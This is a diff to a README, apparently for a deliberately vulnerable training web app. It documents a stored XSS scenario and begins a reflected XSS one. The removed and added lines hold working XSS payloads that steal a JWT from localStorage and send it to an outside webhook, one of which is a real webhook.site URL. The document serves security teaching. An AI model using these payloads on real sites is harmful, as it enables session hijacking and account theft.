@@ -76,9 +76,8 @@ docker compose up --build
 3. Click "Save Changes".
 4. The page will reload and the payload will execute immediately. Every time this profile is loaded, the script will execute.
 
-payload get jwt token: <img src=x onerror=fetch("ISI DENGAN URL UNIK ANDA DISINI/?token="+localStorage.getItem('access')) />
 
-example : `<img src=x onerror="new Image().src='https://webhook.site/2c66c963-2bcf-4233-ac08-ada3a68572f8/?token='+localStorage.getItem('token')" />`
+example to get jwt token from stored xss : `<img src=x onerror=fetch("<link web hook anda>/?token="+localStorage.getItem('token')) />`
 
 ### 7. Reflected XSS
 **Scenario**: The search query on the Employee Directory page is reflected back to the user without escaping HTML characters.
